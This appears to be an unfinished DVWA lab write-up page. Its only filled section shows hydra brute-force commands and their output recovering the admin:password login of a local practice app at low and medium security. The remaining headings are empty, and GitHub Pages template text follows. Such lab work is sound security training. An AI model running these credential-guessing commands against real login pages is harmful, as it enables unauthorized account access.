## DVWA Writeups



- [Brute Force](#brute-force)

- [Command Injection](#command-injection)

- [Cross Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)

- [File Inclusion](#file-inclusion)

- [File Upload](#file-upload)

- [SQL Injection](#sql-injection)

- [SQL Injection (Blind)](#sql-injection-blind)

- [Weak Session IDs](#weak-session-ids)

- [DOM Based Cross Site Scripting (XSS)](#dom-based-cross-site-scripting-xss)

- [Reflected Cross Site Scripting (XSS)](#reflected-cross-site-scripting-xss)

- [Stored Cross Site Scripting (XSS)](#stored-cross-site-scripting-xss)

- [Content Security Policy (CSP) Bypass](#content-security-policy-csp-bypass)

- [JavaScript Attacks](#javascript-attacks)


---


### Brute Force


The goal is to brute force an HTTP login page.

**Security level is currently: low.**

On submitting the username and password we see that it is using get request 

<img width="477" alt="image" src="https://user-images.githubusercontent.com/79740895/185153021-af373095-102b-4d68-88c7-573499351bc5.png">

So let’s use hydra for brute force:

``` 
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
```

Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page.

<!-- {::options parse_block_html="true" /}  -->

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-17 23:50:56
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-17 23:51:59

```
  
</details>

<!-- {::options parse_block_html="false" /} -->

Login credentials found by hydra:
`admin:password`

<br/>

**Security level is currently: medium.**


It is still using get request.

so lets use hydra again:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
```
it still work but this time attack takes significantly longer then before.

on analyzing the login functionality we notice that the response is delayed by 2 or 3 seconds on wrong attempt.

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 09:17:45
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 09:18:50

```
  
</details>

<br/>

**Security level is currently: high.**




---

### Command Injection

---
### Cross Site Request Forgery (CSRF)

---
### File Inclusion

---
### File Upload

---
### SQL Injection

---
### SQL Injection (Blind)

---
### Weak Session IDs

---
### DOM Based Cross Site Scripting (XSS)

---
### Reflected Cross Site Scripting (XSS)

---
### Stored Cross Site Scripting (XSS)

---
### Content Security Policy (CSP) Bypass

---
### JavaScript Attacks


---

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Aftab700/DVWA-Writeup/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
